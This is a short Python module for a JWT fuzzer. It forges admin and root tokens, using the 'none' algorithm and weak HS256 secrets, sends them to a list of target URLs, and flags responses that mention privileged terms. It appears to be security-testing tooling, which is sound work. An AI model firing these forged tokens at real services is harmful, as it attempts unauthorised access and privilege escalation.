import requests
import jwt
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)  # zbog PyJWT stila enkodovanja

class JWTFuzzer:
    def __init__(self):
        self.name = "JSON Web Token Fuzzer"
        self.payloads = [
            {"header": {"alg": "none"}, "payload": {"sub": "admin"}},
            {"header": {"alg": "HS256"}, "payload": {"sub": "admin"}, "key": "secret"},
            {"header": {"alg": "HS256"}, "payload": {"sub": "root"}, "key": "admin123"},
        ]

    def run_tests(self, targets):
        results = {}
        for target in targets:
            for payload in self.payloads:
                try:
                    token = self.create_jwt(payload)
                    status, response_text = self.send_request(target, token)
                    vulnerable = self.analyze_response(response_text)
                    results[f"{target} | alg={payload['header']['alg']}"] = {
                        "status": status,
                        "vulnerable": vulnerable
                    }
                except Exception as e:
                    results[f"{target} | JWT ERROR"] = str(e)
        return results

    def create_jwt(self, payload):
        return jwt.encode(
            payload["payload"],
            payload.get("key", None),
            algorithm=payload["header"]["alg"],
            headers=payload["header"]
        )

    def send_request(self, url, token):
        headers = {"Authorization": f"Bearer {token}"}
        try:
            response = requests.get(url, headers=headers, timeout=5)
            return response.status_code, response.text[:1000]
        except requests.exceptions.RequestException:
            return "ERROR", "No response"

    def analyze_response(self, text):
        return any(keyword in text.lower() for keyword in ["admin", "root", "privilege"])
